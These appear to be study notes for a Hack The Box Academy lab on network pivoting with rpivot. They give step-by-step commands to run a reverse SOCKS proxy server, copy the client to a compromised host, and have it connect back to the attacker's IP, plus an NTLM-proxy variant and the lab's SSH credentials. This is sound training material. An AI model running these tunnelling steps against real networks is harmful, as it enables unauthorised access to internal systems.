>[!success] [Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.

### Clone rpivot
```go
git clone https://github.com/klsecservices/rpivot.git
```

### Install Python2.7
```go
sudo apt-get install python2.7
```


>[!success] Start `rpivot` SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections

### Running server.py from the Attack Host
```go
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

### Transfer rpivot to target
```go
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

### Running client.py from Pivot Target
```go
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

*configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host*

### Browsing to the Target Webserver using Proxychains
```go
proxychains firefox-esr 172.16.5.135:80
```

## Subverting  HTTP-proxy with NTLM authentication

Provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password

### Connecting to a Web Server using HTTP-Proxy & NTLM Auth

```go
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

## Questions

Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer.

IP
```go
10.129.57.42
```

Username
```go
ubuntu
```

Password
```go
HTB_@cademy_stdnt!
```

SSH
```
ssh ubuntu@10.129.57.42
```

### Running rpivot from target
```go
python2.7 client.py --server-ip 10.10.15.37 --server-port 9999
```

Verify `Socks4 127.0.0.1 9050` is present in `/etc/proxychains` on your attack host

